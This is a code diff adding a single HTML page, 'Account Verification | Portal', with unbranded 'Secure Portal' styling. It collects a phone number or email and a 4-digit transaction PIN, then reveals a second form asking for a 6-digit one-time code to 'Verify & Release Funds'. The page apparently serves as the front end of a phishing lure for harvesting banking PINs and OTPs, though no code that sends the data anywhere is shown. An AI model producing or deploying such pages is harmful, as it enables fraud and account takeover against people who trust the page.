@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification | Portal</title>
+</head>
+<body>
+
+    <div class="main-container">
+        <div id="login-section" class="card">
+            <div class="logo-area">
+                <div class="logo-placeholder">Secure Portal</div>
+            </div>
+            
+            <h3>Welcome Back</h3>
+            <p>Verify your account to continue</p>
+
+            <form id="login-form">
+                <div class="input-group">
+                    <label for="phone">Phone Number / Email</label>
+                    <input type="tel" id="user-identifier" placeholder="0801 234 5678" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Transaction PIN</label>
+                    <input type="password" id="user-pin" placeholder="****" maxlength="4" required>
+                </div>
+
+                <button type="submit" id="next-btn">Sign In</button>
+            </form>
+        </div>
+
+        <div id="otp-section" class="card" style="display: none;">
+            <h3>Verification Required</h3>
+            <p>Enter the 6-digit code sent to your device.</p>
+            
+            <form id="otp-form">
+                <input type="number" id="otp-code" placeholder="123456" required>
+                <button type="submit">Verify & Release Funds</button>
+            </form>
+        </div>
+    </div>
+
+</body>
+</html>
+
